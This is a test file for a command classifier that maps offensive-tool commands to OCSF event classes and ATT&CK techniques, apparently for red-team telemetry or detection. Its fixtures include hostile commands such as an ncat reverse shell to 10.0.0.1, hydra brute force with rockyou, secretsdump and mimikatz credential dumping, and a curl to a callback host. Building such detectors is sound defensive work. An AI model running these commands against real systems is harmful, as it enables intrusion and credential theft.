import { describe, it, expect } from 'vitest';
import { classifyCommand } from '../src/classifier.js';

// OCSF class_uid constants from docs/red-team-taxonomy.md.
const NETWORK_ACTIVITY = 4001;
const PROCESS_ACTIVITY = 1007;
const AUTHENTICATION = 3002;
// OCSF Discovery category 5; Device Inventory Info class 5001.
const DEVICE_INVENTORY_INFO = 5001;
const WEB_RESOURCES_ACTIVITY = 6001;

describe('classifyCommand — tool family → OCSF mapping', () => {
  it('classifies nmap as port_scan / Network Activity / T1046', () => {
    const c = classifyCommand('nmap -sS -p 1-1024 192.168.1.5');
    expect(c.activity_type).toBe('port_scan');
    expect(c.class_uid).toBe(NETWORK_ACTIVITY);
    expect(c.activity_id).toBe(1);
    expect(c.type_uid).toBe(NETWORK_ACTIVITY * 100 + 1);
    expect(c.technique_uid).toBe('T1046');
    expect(c.tactic).toBe('Discovery');
    expect(c.tool).toBe('nmap');
  });

  it.each(['masscan', 'rustscan', 'unicornscan'])(
    'classifies %s as port_scan',
    (tool) => {
      const c = classifyCommand(`${tool} 10.0.0.0/24`);
      expect(c.activity_type).toBe('port_scan');
      expect(c.class_uid).toBe(NETWORK_ACTIVITY);
      expect(c.tool).toBe(tool);
    },
  );

  it('classifies nc as network_connection / Network Activity / T1095', () => {
    const c = classifyCommand('nc 10.0.0.1 4444');
    expect(c.activity_type).toBe('network_connection');
    expect(c.class_uid).toBe(NETWORK_ACTIVITY);
    expect(c.technique_uid).toBe('T1095');
    expect(c.tool).toBe('nc');
  });

  it('classifies ncat the same as nc', () => {
    const c = classifyCommand('ncat -e /bin/bash 10.0.0.1 4444');
    expect(c.activity_type).toBe('network_connection');
    expect(c.tool).toBe('ncat');
  });

  it('classifies ssh as ssh_login_attempt / Authentication / T1021.004', () => {
    const c = classifyCommand('ssh user@10.0.0.1');
    expect(c.activity_type).toBe('ssh_login_attempt');
    expect(c.class_uid).toBe(AUTHENTICATION);
    expect(c.activity_id).toBe(1);
    expect(c.technique_uid).toBe('T1021.004');
    expect(c.tactic).toBe('Lateral Movement');
    expect(c.tool).toBe('ssh');
  });

  it.each(['hydra', 'medusa', 'patator', 'crowbar'])(
    'classifies %s as credential_brute_force / Authentication / T1110',
    (tool) => {
      const c = classifyCommand(`${tool} -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.1 ssh`);
      expect(c.activity_type).toBe('credential_brute_force');
      expect(c.class_uid).toBe(AUTHENTICATION);
      expect(c.technique_uid).toBe('T1110');
      expect(c.tool).toBe(tool);
    },
  );

  it.each(['john', 'hashcat'])(
    'classifies %s as password_cracking / Process Activity / T1110.002',
    (tool) => {
      const c = classifyCommand(`${tool} hashes.txt`);
      expect(c.activity_type).toBe('password_cracking');
      expect(c.class_uid).toBe(PROCESS_ACTIVITY);
      expect(c.technique_uid).toBe('T1110.002');
      expect(c.tool).toBe(tool);
    },
  );

  it.each(['sqlmap', 'nikto', 'wpscan'])(
    'classifies %s as web_attack / Web Resources Activity / T1190',
    (tool) => {
      const c = classifyCommand(`${tool} -u https://target.example/login`);
      expect(c.activity_type).toBe('web_attack');
      expect(c.class_uid).toBe(WEB_RESOURCES_ACTIVITY);
      expect(c.technique_uid).toBe('T1190');
      expect(c.tool).toBe(tool);
    },
  );

  it.each(['gobuster', 'dirb', 'wfuzz', 'ffuf', 'feroxbuster'])(
    'classifies %s as web_discovery / Web Resources Activity / T1595.003',
    (tool) => {
      const c = classifyCommand(`${tool} dir -u https://target.example -w /usr/share/wordlists/dirb/common.txt`);
      expect(c.activity_type).toBe('web_discovery');
      expect(c.class_uid).toBe(WEB_RESOURCES_ACTIVITY);
      expect(c.technique_uid).toBe('T1595.003');
      expect(c.tool).toBe(tool);
    },
  );

  it.each(['enum4linux', 'smbclient', 'crackmapexec', 'nbtscan', 'rpcclient', 'ldapsearch'])(
    'classifies %s as host_discovery / Device Inventory Info / T1018',
    (tool) => {
      const c = classifyCommand(`${tool} 10.0.0.5`);
      expect(c.activity_type).toBe('host_discovery');
      // OCSF: Discovery is category_uid 5; Device Inventory Info is class
      // 5001. The previous value (1009) was an invalid class/category mix.
      expect(c.class_uid).toBe(DEVICE_INVENTORY_INFO);
      expect(c.category_uid).toBe(5);
      expect(c.technique_uid).toBe('T1018');
      expect(c.tool).toBe(tool);
    },
  );

  it.each(['msfconsole', 'msfvenom', 'setoolkit'])(
    'classifies %s as exploit_framework',
    (tool) => {
      const c = classifyCommand(`${tool} -h`);
      expect(c.activity_type).toBe('exploit_framework');
      expect(c.class_uid).toBe(PROCESS_ACTIVITY);
      expect(c.tool).toBe(tool);
    },
  );

  it('classifies unknown commands as the generic process_execution fallback', () => {
    const c = classifyCommand('echo hello world');
    expect(c.activity_type).toBe('process_execution');
    expect(c.class_uid).toBe(PROCESS_ACTIVITY);
    expect(c.activity_id).toBe(1);
    expect(c.technique_uid).toBeUndefined();
    expect(c.tactic).toBeUndefined();
  });
});

describe('classifyCommand — command-string handling', () => {
  it('handles compound commands by classifying the leading sub-command', () => {
    // First segment determines classification — pipelines like
    // `nmap … && nc …` classify as port_scan, not network_connection.
    expect(classifyCommand('nmap -p 22 10.0.0.1 && nc 10.0.0.1 22').activity_type).toBe(
      'port_scan',
    );
    expect(classifyCommand('nmap -p 22 10.0.0.1 ; nc 10.0.0.1 22').activity_type).toBe(
      'port_scan',
    );
    expect(classifyCommand('nmap -p 22 10.0.0.1 || echo done').activity_type).toBe(
      'port_scan',
    );
  });

  it('handles pipe filters without misclassifying as the downstream tool', () => {
    // `nmap … | grep open` is still a port scan.
    expect(classifyCommand('nmap -p 22,80 10.0.0.1 | grep open').activity_type).toBe(
      'port_scan',
    );
  });

  it('does not misclassify because of a filename that contains a tool name', () => {
    // `cat nmap-results.txt` is not a port scan.
    expect(classifyCommand('cat nmap-results.txt').activity_type).toBe('process_execution');
  });

  it('does not misclassify a tool name appearing inside a quoted string', () => {
    // `echo "nmap is a scanner"` is not a port scan.
    expect(classifyCommand('echo "nmap is a scanner"').activity_type).toBe('process_execution');
  });

  it('returns the generic fallback for an empty command', () => {
    expect(classifyCommand('').activity_type).toBe('process_execution');
    expect(classifyCommand('   ').activity_type).toBe('process_execution');
  });

  it('strips a leading env / path prefix and still finds the tool', () => {
    expect(classifyCommand('/usr/bin/nmap 10.0.0.1').activity_type).toBe('port_scan');
    expect(classifyCommand('sudo nmap 10.0.0.1').activity_type).toBe('port_scan');
    expect(classifyCommand('PATH=/foo nmap 10.0.0.1').activity_type).toBe('port_scan');
  });

  it('handles sudo with options and the -- separator (review-finding regression)', () => {
    // Common Kali shapes: `sudo -E nmap …` (preserve env), `sudo -n nmap …`
    // (non-interactive), `sudo -- nmap …` (end-of-options). All must
    // resolve to the real executable.
    expect(classifyCommand('sudo -E nmap 10.0.0.1').activity_type).toBe('port_scan');
    expect(classifyCommand('sudo -n nmap 10.0.0.1').activity_type).toBe('port_scan');
    expect(classifyCommand('sudo --preserve-env=PATH nmap 10.0.0.1').activity_type).toBe(
      'port_scan',
    );
    expect(classifyCommand('sudo -u kali nmap 10.0.0.1').activity_type).toBe('port_scan');
    expect(classifyCommand('sudo -- nmap 10.0.0.1').activity_type).toBe('port_scan');
  });

  it('classifies sshpass-wrapped ssh as ssh_login_attempt (cycle-13 review)', () => {
    expect(classifyCommand('sshpass -p secret ssh user@target.example').activity_type).toBe(
      'ssh_login_attempt',
    );
    expect(classifyCommand('sshpass -p secret -P prompt ssh user@target').activity_type).toBe(
      'ssh_login_attempt',
    );
    // Attached short form: `sshpass -psecret ssh ...`
    expect(classifyCommand('sshpass -psecret ssh user@target.example').activity_type).toBe(
      'ssh_login_attempt',
    );
  });

  it('splits credential-access impacket tools out of remote_execution (cycle-13 review)', () => {
    // secretsdump / GetUserSPNs / GetNPUsers — credential_access semantics.
    expect(classifyCommand('secretsdump.py alice@dc.example').activity_type).toBe(
      'credential_dumping',
    );
    expect(classifyCommand('impacket-secretsdump alice@dc.example').activity_type).toBe(
      'credential_dumping',
    );
    expect(classifyCommand('getuserspns.py corp.example/alice -dc-ip dc.example').activity_type).toBe(
      'credential_dumping',
    );
    expect(classifyCommand('getnpusers.py corp.example/').activity_type).toBe(
      'credential_dumping',
    );
    // ntlmrelayx is network_poisoning, not remote_execution.
    expect(classifyCommand('ntlmrelayx.py -t smb://10.0.0.1').activity_type).toBe(
      'network_poisoning',
    );
    // True remote-execution tools stay where they are.
    expect(classifyCommand('psexec.py corp/alice@dc.example').activity_type).toBe(
      'remote_execution',
    );
    expect(classifyCommand('impacket-dcomexec corp/alice@dc.example').activity_type).toBe(
      'remote_execution',
    );
    expect(classifyCommand('impacket-atexec corp/alice@dc.example').activity_type).toBe(
      'remote_execution',
    );
  });

  it('classifies through bash -lc / sh -ic option-cluster forms (cycle-12 review)', () => {
    expect(classifyCommand("bash -lc 'nmap -p 22 10.0.0.1'").activity_type).toBe('port_scan');
    expect(classifyCommand("sh -lc 'hydra -l u -P p host ssh'").activity_type).toBe(
      'credential_brute_force',
    );
    expect(classifyCommand('zsh -ic "ssh user@host"').activity_type).toBe('ssh_login_attempt');
  });

  it('classifies through bash/sh/zsh -c "<inner-command>" wrappers (pre-emptive)', () => {
    expect(classifyCommand("bash -c 'nmap -p 22 10.0.0.1'").activity_type).toBe('port_scan');
    expect(classifyCommand('sh -c "hydra -l u -P p host ssh"').activity_type).toBe(
      'credential_brute_force',
    );
    expect(classifyCommand("zsh -c 'curl https://target.example/x'").activity_type).toBe(
      'process_execution',
    );
    expect(classifyCommand('dash -c "ssh user@10.0.0.1"').activity_type).toBe(
      'ssh_login_attempt',
    );
  });

  it('classifies the new tool families (pre-emptive cycle-10)', () => {
    expect(classifyCommand('responder -I eth0').activity_type).toBe('network_poisoning');
    expect(classifyCommand('mimikatz').activity_type).toBe('credential_dumping');
    expect(classifyCommand('pypykatz lsa minidump dump.bin').activity_type).toBe(
      'credential_dumping',
    );
    expect(classifyCommand('evil-winrm -i 10.0.0.1 -u alice').activity_type).toBe(
      'remote_execution',
    );
    expect(classifyCommand('impacket-psexec alice@dc.example').activity_type).toBe(
      'remote_execution',
    );
    // secretsdump is credential_dumping, not remote_execution (cycle-13).
    expect(classifyCommand('secretsdump.py alice@dc.example').activity_type).toBe(
      'credential_dumping',
    );
    expect(classifyCommand('kerbrute userenum -d corp.example users.txt').activity_type).toBe(
      'host_discovery',
    );
    expect(classifyCommand('bloodhound-python -u alice -p p -d corp.example').activity_type).toBe(
      'host_discovery',
    );
    expect(classifyCommand('tcpdump -i eth0 -n').activity_type).toBe('host_discovery');
    expect(classifyCommand('dig @10.0.0.1 corp.example AXFR').activity_type).toBe(
      'host_discovery',
    );
    expect(classifyCommand('searchsploit cve-2021-44228').activity_type).toBe(
      'exploit_framework',
    );
  });

  it('handles proxychains -f config wrapper option (cycle-9 review)', () => {
    // proxychains4 -f proxy.conf hydra ... — `-f` takes a config-file
    // arg. Without per-wrapper handling, this returns 'proxy.conf' as
    // the executable.
    expect(
      classifyCommand('proxychains4 -f proxy.conf hydra -l u -P p host ssh').activity_type,
    ).toBe('credential_brute_force');
    expect(classifyCommand('proxychains -f /tmp/p.conf nmap 10.0.0.1').activity_type).toBe(
      'port_scan',
    );
  });

  it('classifies through transparent wrappers (cycle-8 review)', () => {
    // proxychains4 / time / nice / env / etc. are transparent wrappers —
    // the classifier should resolve to the inner command.
    expect(classifyCommand('proxychains4 hydra -l u -P p host ssh').activity_type).toBe(
      'credential_brute_force',
    );
    expect(classifyCommand('time nmap 10.0.0.1').activity_type).toBe('port_scan');
    expect(classifyCommand('nice -n 5 nmap 10.0.0.1').activity_type).toBe('port_scan');
    expect(classifyCommand('env -i hydra -l u -P p host ssh').activity_type).toBe(
      'credential_brute_force',
    );
    expect(classifyCommand('proxychains hydra -l u -P p host ssh').activity_type).toBe(
      'credential_brute_force',
    );
    // Nested wrappers also work.
    expect(classifyCommand('sudo proxychains4 hydra -l u -P p host ssh').activity_type).toBe(
      'credential_brute_force',
    );
  });

  it('treats single & as a top-level separator (cycle-8 review)', () => {
    // `cmd1 & cmd2` backgrounds cmd1 and runs cmd2 next — these are
    // distinct commands and only the leading one drives classification.
    expect(classifyCommand('nmap 10.0.0.1 & curl https://callback').activity_type).toBe(
      'port_scan',
    );
  });

  it('still preserves redirection forms like 2>&1 and &> (does not split)', () => {
    // `2>&1` is a redirection, not a separator — single `&` after `>`
    // must NOT trigger the split.
    expect(classifyCommand('nmap 10.0.0.1 -oN scan.txt 2>&1').activity_type).toBe('port_scan');
    expect(classifyCommand('nmap 10.0.0.1 &> scan.txt').activity_type).toBe('port_scan');
  });

  it('strips env assignments after sudo (cycle-5 review)', () => {
    // sudo passes positional `KEY=value` arguments through to the command
    // env. They are not the executable.
    expect(classifyCommand('sudo FOO=bar nmap 10.0.0.1').activity_type).toBe('port_scan');
    expect(classifyCommand('sudo -E FOO=bar nmap 10.0.0.1').activity_type).toBe('port_scan');
    expect(classifyCommand('sudo FOO=bar BAZ=qux hydra -l u -P p host ssh').activity_type).toBe(
      'credential_brute_force',
    );
  });

  it('exposes a numeric default_severity_id on the OCSF 0–6 scale', () => {
    // Mirrors the Python SeverityId enum (UNKNOWN=0..FATAL=6).
    for (const cmd of ['nmap 10.0.0.1', 'hydra -l u -p p host ssh', 'ssh u@h', 'echo hi']) {
      const sev = classifyCommand(cmd).default_severity_id;
      expect(sev).toBeGreaterThanOrEqual(0);
      expect(sev).toBeLessThanOrEqual(6);
    }
    // Brute force is at least HIGH (4); generic is INFO (1).
    expect(classifyCommand('hydra -l u -P p host ssh').default_severity_id).toBeGreaterThanOrEqual(4);
    expect(classifyCommand('echo hi').default_severity_id).toBe(1);
  });

  it('preserves type_uid = class_uid * 100 + activity_id', () => {
    const c = classifyCommand('hydra -l u -P p host ssh');
    expect(c.type_uid).toBe(c.class_uid * 100 + c.activity_id);
  });

  it('emits category_uid and category_name on every classification (cycle-6 review)', () => {
    // OCSF Base Event marks category_uid as required.
    for (const cmd of [
      'nmap 10.0.0.1',
      'nc 10.0.0.1 4444',
      'ssh user@host',
      'hydra -l u -P p host ssh',
      'sqlmap -u https://target/x',
      'gobuster dir -u https://target -w wl',
      'enum4linux 10.0.0.1',
      'msfconsole',
      'echo hi',
    ]) {
      const c = classifyCommand(cmd);
      expect(typeof c.category_uid).toBe('number');
      expect(typeof c.category_name).toBe('string');
      expect(c.category_name.length).toBeGreaterThan(0);
    }
  });

  it('preserves the leading executable on the generic fallback (cycle-6 review)', () => {
    // The generic fallback used to drop the executable, losing the main
    // discriminator for non-classified commands like curl / python / bash.
    expect(classifyCommand('curl https://target.example/x').tool).toBe('curl');
    expect(classifyCommand('python -c "print(1)"').tool).toBe('python');
    expect(classifyCommand('bash deploy.sh').tool).toBe('bash');
  });

  it('uses OCSF activity_id 99 (Other) for web_attack and web_discovery (cycle-6 review)', () => {
    // OCSF Web Resources Activity IDs 1–7 are CRUD/Send/Import/Export —
    // none semantically matches "attack" or "wordlist scan". Use Other
    // (99) so SIEM consumers don't see misleading activity labels.
    expect(classifyCommand('sqlmap -u https://target/x').activity_id).toBe(99);
    expect(classifyCommand('gobuster dir -u https://target -w wl').activity_id).toBe(99);
  });
});
